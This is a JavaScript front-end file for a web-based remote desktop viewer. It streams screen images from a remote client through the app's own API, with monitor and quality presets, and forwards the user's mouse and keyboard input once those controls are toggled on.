// language: JavaScript, file: public/js/rdp.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';

$('target').textContent = `${hostName} @ ${hostIp}`;

let cfg = { monitor: 0, width: 1280, height: 720, quality: 50, fps: 10, keyboard: false, mouse: false };
let monitors = [];
let running = false;
let lastMouseSent = 0;
let framesThisSec = 0;
let lastFpsTick = Date.now();

const PRESETS = {
  low:    { height: 480, quality: 40, fps: 8  },
  med:    { height: 720, quality: 55, fps: 10 },
  high:   { height: 900, quality: 75, fps: 12 },
  native: null,
};

const img = document.createElement('img');
img.draggable = false;

img.addEventListener('load', () => {
  $('dot').classList.add('on');
  framesThisSec++;
  const now = Date.now();
  if (now - lastFpsTick >= 1000) {
    $('fps').textContent = `${framesThisSec} fps`;
    framesThisSec = 0;
    lastFpsTick = now;
  }
});
img.addEventListener('error', () => $('dot').classList.remove('on'));

async function loadMonitors() {
  try {
    const r = await fetch(`/api/clients/${clientId}/monitors`);
    if (!r.ok) return;
    monitors = await r.json();
    const sel = $('monitor');
    sel.innerHTML = '';
    if (monitors.length === 0) {
      sel.innerHTML = '<option value="0">default</option>';
      return;
    }
    monitors.forEach((m, i) => {
      const o = document.createElement('option');
      o.value = String(i);
      o.textContent = `#${i} ${m.width}×${m.height}`;
      sel.appendChild(o);
    });
    sel.value = String(cfg.monitor);
    applyPreset($('preset').value);
  } catch {}
}

function applyPreset(name) {
  const mon = monitors[cfg.monitor];
  if (!mon) return;

  if (name === 'native') {
    cfg.width   = mon.width;
    cfg.height  = mon.height;
    cfg.quality = 75;
    cfg.fps     = 10;
    return;
  }

  const p = PRESETS[name];
  if (!p) return;

  const targetH = Math.min(p.height, mon.height);
  const aspect  = mon.width / mon.height;
  let targetW   = Math.round(targetH * aspect / 2) * 2;
  if (targetW > mon.width) targetW = mon.width;

  cfg.width   = targetW;
  cfg.height  = targetH;
  cfg.quality = p.quality;
  cfg.fps     = p.fps;
}

async function start() {
  const r = await fetch(`/api/clients/${clientId}/rdp/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (!r.ok) { alert('rdp start failed'); return; }
  running = true;
  const stage = $('stage');
  stage.innerHTML = '';
  stage.appendChild(img);
  loop();
}

async function stop() {
  running = false;
  try { await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' }); } catch {}
}

async function loop() {
  while (running) {
    const t0 = performance.now();
    await new Promise((resolve) => {
      const tmp = new Image();
      tmp.onload = () => { img.src = tmp.src; resolve(true); };
      tmp.onerror = () => resolve(false);
      tmp.src = `/api/clients/${clientId}/screen?t=${Date.now()}`;
    });
    if (!running) break;
    const elapsed = performance.now() - t0;
    const target = 1000 / Math.max(cfg.fps, 1);
    if (elapsed < target) await new Promise(r => setTimeout(r, target - elapsed));
  }
}

$('preset').addEventListener('change', async (e) => {
  applyPreset(e.target.value);
  if (running) { await stop(); await new Promise(r => setTimeout(r, 250)); await start(); }
});

$('monitor').addEventListener('change', async (e) => {
  cfg.monitor = Number(e.target.value) || 0;
  applyPreset($('preset').value);
  if (running) { await stop(); await new Promise(r => setTimeout(r, 250)); await start(); }
});

async function pushCfg() {
  try {
    await fetch(`/api/clients/${clientId}/rdp/update`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keyboard: cfg.keyboard, mouse: cfg.mouse }),
    });
  } catch {}
}

$('kb').addEventListener('click', () => {
  cfg.keyboard = !cfg.keyboard;
  $('kb').classList.toggle('active', cfg.keyboard);
  pushCfg();
});

$('mouse').addEventListener('click', () => {
  cfg.mouse = !cfg.mouse;
  $('mouse').classList.toggle('active', cfg.mouse);
  pushCfg();
});

function sendInput(payload) {
  fetch(`/api/clients/${clientId}/input`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    keepalive: true,
  }).catch(() => {});
}

function norm(e) {
  const r = img.getBoundingClientRect();
  const x = (e.clientX - r.left) / r.width;
  const y = (e.clientY - r.top)  / r.height;
  return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
}

img.addEventListener('mousemove', (e) => {
  if (!cfg.mouse) return;
  const now = performance.now();
  if (now - lastMouseSent < 25) return;
  lastMouseSent = now;
  const p = norm(e);
  sendInput({ type: 'mouse_move', x: p.x, y: p.y });
});

img.addEventListener('mousedown', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_down', button: btnName(e.button) });
});

img.addEventListener('mouseup', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_up', button: btnName(e.button) });
});

img.addEventListener('contextmenu', (e) => e.preventDefault());

img.addEventListener('wheel', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_wheel', dy: Math.sign(e.deltaY) });
}, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: true });
});

document.addEventListener('keyup', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: false });
});

function btnName(b) { return b === 2 ? 'right' : b === 1 ? 'middle' : 'left'; }

$('stop').addEventListener('click', async () => {
  await stop();
  window.close();
});

window.addEventListener('beforeunload', () => { stop(); });

loadMonitors().then(start);